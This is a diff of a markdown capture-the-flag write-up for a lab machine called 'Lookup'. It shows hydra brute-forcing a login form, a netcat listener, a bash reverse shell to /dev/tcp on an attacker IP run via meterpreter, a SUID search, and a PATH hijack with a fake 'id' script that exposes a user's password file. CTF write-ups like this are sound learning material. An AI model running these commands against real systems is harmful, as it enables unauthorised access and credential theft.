@@ -3,7 +3,9 @@
 When I put in admin to the username field, the error message changes and just says "Wrong Password" rather than "Wrong Username & Password" and one of the content headers disappears
 
 `hydra -l admin -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"`
+
 Couldnt find anything with this, so I ran another to check for some more usernames, thinking admin may be part of the root flag
+
 `hydra -L /home/kali/Desktop/SecLists/Usernames/xato-net-10-million-usernames.txt  -p test lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username"`
 
 Results:
@@ -13,7 +15,7 @@ Results:
 ```
 
 As we can see, Jose was also found, so I ran the password check:
-`hydra -l jose -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"`
+```hydra -l jose -P /home/kali/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"```
 
 And we find:
 ```
@@ -29,10 +31,10 @@ RHOST: 10.66.144.55
 VHOST: files.lookup.thm
 
 I wanted a reverse shell so I ran this on my client to listen for a connection:
-`nc -lvnp 9001`
+```nc -lvnp 9001```
 
 and I ran this in the meterpreter instance: 
-`execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/192.168.216.167/9001 0>&1'"`
+```execute -f /bin/bash -a "-c 'bash -i >& /dev/tcp/192.168.216.167/9001 0>&1'"```
 
 That worked and created a connection, then I needed a more stable shell so I ran:
 ```
@@ -49,6 +51,7 @@ So now began the big search for how to get into think, first, check the home dir
 we find a **.passwords** file, which is interesting, that's not normally there.
 
 Now lets try to find some SUID binaries that we may be able to run.
+
 `find / -perm /4000 2>/dev/null`
 
 We will find a **/usr/sbin/pwm**, which is interesting since that one is not normally there and it's owned by root. 
@@ -61,17 +64,17 @@ export PATH=/tmp:$PATH
 echo $PATH
 ```
 to connect us to tmp as our main path, and then we'll just create a id file with the contents:
-`
+```
 #! /bin/bash
 echo "uid=33(think) gid=33(think) groups=33(think)"
-`
+```
 
 And once we do, it will think that we are 'think' and return the .passwords file under their account.
 Once we run it, we get this output:
-`
+```
 think
 josemario.AKA(think)
-`
+```
 Giving us the user flag
 
 ## Root Flag:
